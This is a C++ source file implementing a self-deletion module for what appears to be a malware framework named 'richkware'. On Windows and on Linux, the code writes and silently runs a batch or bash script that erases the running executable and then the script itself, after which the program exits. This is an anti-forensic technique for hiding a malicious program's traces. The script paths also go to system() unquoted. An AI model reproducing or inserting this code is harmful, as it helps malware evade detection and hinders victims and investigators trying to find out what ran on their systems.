#include "richkware/modules/self_deletion.hpp"
#include "richkware/utils/logger.hpp"
#include <filesystem>
#include <fstream>

#ifdef _WIN32
#include <windows.h>
#elif defined(__linux__)
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <linux/limits.h>
#endif

namespace fs = std::filesystem;

namespace richkware::modules {

// SelfDeletion implementation
class SelfDeletion::Impl {
public:
    bool deletion_scheduled_{false};
    std::string deletion_method_;

    core::Result<void> schedule_deletion(const std::string& method) {
        deletion_scheduled_ = true;
        deletion_method_ = method;

        LOG_INFO("Self-deletion scheduled with method: {}", method);
        return core::Result<void>{};
    }

    core::Result<void> delete_immediately() {
#ifdef _WIN32
        // Windows self-deletion using batch file
        char module_path[MAX_PATH];
        GetModuleFileNameA(NULL, module_path, MAX_PATH);

        std::string batch_file = std::string(module_path) + "_delete.bat";
        std::ofstream bat(batch_file);
        bat << "@echo off\n";
        bat << ":loop\n";
        bat << "del \"" << module_path << "\"\n";
        bat << "if exist \"" << module_path << "\" goto loop\n";
        bat << "del \"" << batch_file << "\"\n";
        bat.close();

        // Execute batch file and exit
        system(("start /b " + batch_file).c_str());
        exit(0);

#elif defined(__linux__)
        // Linux self-deletion using rm command
        char exe_path[PATH_MAX];
        ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
        if (len > 0) {
            exe_path[len] = '\0';

            // Create a script to delete ourselves
            std::string script_path = std::string(exe_path) + "_delete.sh";
            std::ofstream script(script_path);
            script << "#!/bin/bash\n";
            script << "sleep 1\n";  // Wait for process to exit
            script << "rm -f \"" << exe_path << "\"\n";
            script << "rm -f \"" << script_path << "\"\n";
            script.close();

            // Make executable and run in background
            chmod(script_path.c_str(), 0755);
            system(("bash " + script_path + " &").c_str());
        }
        exit(0);
#else
        return core::RichkwareError{core::ErrorCode::SystemError, "Self-deletion not supported on this platform"};
#endif

        return core::Result<void>{};
    }

    bool is_deletion_scheduled() const {
        return deletion_scheduled_;
    }

    core::Result<void> cancel_deletion() {
        deletion_scheduled_ = false;
        deletion_method_.clear();
        LOG_INFO("Self-deletion cancelled");
        return core::Result<void>{};
    }
};

SelfDeletion::SelfDeletion() : pimpl_(std::make_unique<Impl>()) {}
SelfDeletion::~SelfDeletion() = default;

core::Result<void> SelfDeletion::schedule_deletion(const std::string& method) {
    return pimpl_->schedule_deletion(method);
}

core::Result<void> SelfDeletion::delete_immediately() {
    return pimpl_->delete_immediately();
}

bool SelfDeletion::is_deletion_scheduled() const {
    return pimpl_->is_deletion_scheduled();
}

core::Result<void> SelfDeletion::cancel_deletion() {
    return pimpl_->cancel_deletion();
}

} // namespace richkware::modules